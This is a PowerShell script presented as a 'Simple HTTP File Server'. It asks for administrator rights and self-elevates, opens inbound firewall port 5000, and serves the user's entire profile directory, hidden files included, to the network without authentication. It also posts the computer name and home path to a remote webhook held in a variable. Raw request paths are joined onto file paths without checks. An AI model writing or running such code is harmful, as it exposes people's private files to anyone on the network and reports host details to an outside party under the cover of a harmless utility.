<#
============================== Beigeworm's Simple HTTP File Server ===============================

SYNOPSIS
This script serves the contents the USER directory to the ip of the system.
(NOTE TO SELF - i still need to add discord notification of local ip address)

INSTRUCTIONS
Run script and input given URL in a browser.

#>

Write-Host "Starting Simple HTTP Server..." -ForegroundColor Green
Write-Host "#====================== Simple HTTP File Server ======================="

Add-Type -AssemblyName PresentationCore,PresentationFramework
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Application]::EnableVisualStyles()

$Button = [System.Windows.MessageBoxButton]::OKCancel
$ErrorIco = [System.Windows.MessageBoxImage]::Information
$Ask = '        This Script Needs Administrator Privileges.

        Select "OK" to Run as an Administrator
        
        Select "Cancel" to Stop the Script
        
        (Needed for Opening Ports and Serving Files)'

If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
    Write-Host "Admin privileges needed for this script..." -ForegroundColor Red
    Write-Host "Sending User Prompt."
    $Prompt = [System.Windows.MessageBox]::Show($Ask, "Run as an Admin?", $Button, $ErrorIco) 
    Switch ($Prompt) {
        OK {
            Write-Host "This script will self elevate to run as an Administrator and continue."
            $fpath = $env:USERPROFILE
            $fpath | Out-File -FilePath "$env:temp/homepath.txt"
            sleep 1
            Start-Process PowerShell.exe -ArgumentList ("-NoProfile -ExecutionPolicy Bypass -File `"{0}`"" -f $PSCommandPath) -Verb RunAs
            Exit
        }
        Cancel {
            Write-Host "Cancelling...." -ForegroundColor Red
            Exit
        }
    }
}


$whuri = "$dc"

New-NetFirewallRule -DisplayName "AllowWebServer" -Direction Inbound -Protocol TCP –LocalPort 5000 -Action Allow
$loip = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Wi-Fi" | Select-Object -ExpandProperty IPAddress
$hpath = Get-Content -Path "$env:temp/homepath.txt"

$escmsgsys = $hpath -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
$jsonsys = @{"username" = "$env:COMPUTERNAME" 
            "content" = $escmsgsys} | ConvertTo-Json
Start-Sleep 1
Invoke-RestMethod -Uri $whuri -Method Post -ContentType "application/json" -Body $jsonsys


cd "$hpath"
Write-Host "Server Starting at > http://localhost:5000/"
Write-Host ("Other Network Devices Can Reach it at > http://"+$loip+":5000")
$httpsrvlsnr = New-Object System.Net.HttpListener;

$httpsrvlsnr.Prefixes.Add("http://"+$loip+":5000/");
$httpsrvlsnr.Prefixes.Add("http://localhost:5000/");

$httpsrvlsnr.Start();
$webroot = New-PSDrive -Name webroot -PSProvider FileSystem -Root $PWD.Path
[byte[]]$buffer = $null
Write-Host "==== SESSION STARTED! ====" -ForegroundColor Green
while ($httpsrvlsnr.IsListening) {
    try {
        $ctx = $httpsrvlsnr.GetContext();
        
        if ($ctx.Request.RawUrl -eq "/") {
            $html = "<html><body><ul>"
            $html += "<li><a href='/stop'>STOP SERVER</a></li>"
            $html += "<br></br><h3>Files</h3>"
            $files = Get-ChildItem -Path $PWD.Path -Force
            foreach ($file in $files) {
                $fileUrl = $file.FullName -replace [regex]::Escape($PWD.Path), ''
                if ($file.PSIsContainer) {
                    $html += "<li><a href='$fileUrl'>$file</a> <a href='/browse$fileUrl'> : : Open Folder</a></li>"
                } else {
                    $html += "<li><a href='$fileUrl'>$file</a> <a href='/download$fileUrl' download> : : Download</a></li>"
                }
            }
            $html += "</ul></body></html>"
            $buffer = [System.Text.Encoding]::UTF8.GetBytes($html);
            $ctx.Response.ContentLength64 = $buffer.Length;
            $ctx.Response.OutputStream.WriteAsync($buffer, 0, $buffer.Length)
        }
        elseif ($ctx.Request.RawUrl -match "^/stop") {
            $httpsrvlsnr.Stop();
            Remove-PSDrive -Name webroot -PSProvider FileSystem;
            Write-Host "==== ENDING SESSION ====" -ForegroundColor Red
        }
        elseif ($ctx.Request.RawUrl -match "^/download/.+") {
            $filePath = Join-Path -Path $PWD.Path -ChildPath ($ctx.Request.RawUrl -replace "^/download", "")
            if ([System.IO.File]::Exists($filePath)) {
                $ctx.Response.ContentType = 'application/octet-stream'
                $ctx.Response.ContentLength64 = (Get-Item -Path $filePath).Length
                $fileStream = [System.IO.File]::OpenRead($filePath)
                $fileStream.CopyTo($ctx.Response.OutputStream)
                $ctx.Response.OutputStream.Flush()
                $ctx.Response.Close()
                $fileStream.Close()
            }
        }
        elseif ($ctx.Request.RawUrl -match "^/browse/.+") {
            $folderPath = Join-Path -Path $PWD.Path -ChildPath ($ctx.Request.RawUrl -replace "^/browse", "")
            if ([System.IO.Directory]::Exists($folderPath)) {
                $html = "<html><body><h3>Contents of $folderPath</h3><ul>"
                $files = Get-ChildItem -Path $folderPath -Force
                foreach ($file in $files) {
                    $fileUrl = $file.FullName -replace [regex]::Escape($PWD.Path), ''
                    if ($file.PSIsContainer) {
                        $html += "<li><a href='/browse$fileUrl'>$file</a></li>"
                    } else {
                        $html += "<li><a href='$fileUrl'>$file</a> <a href='/download$fileUrl' download>Download</a></li>"
                    }
                }
                $html += "</ul></body></html>"
                $buffer = [System.Text.Encoding]::UTF8.GetBytes($html);
                $ctx.Response.ContentLength64 = $buffer.Length;
                $ctx.Response.OutputStream.WriteAsync($buffer, 0, $buffer.Length)
            }
        }

    }
    catch [System.Net.HttpListenerException] {
        Write-Host "==== Server Information ====" -ForegroundColor Green
        Write-Host ($_);
    }
}
Write-Host "Server Stopped!" -ForegroundColor Green
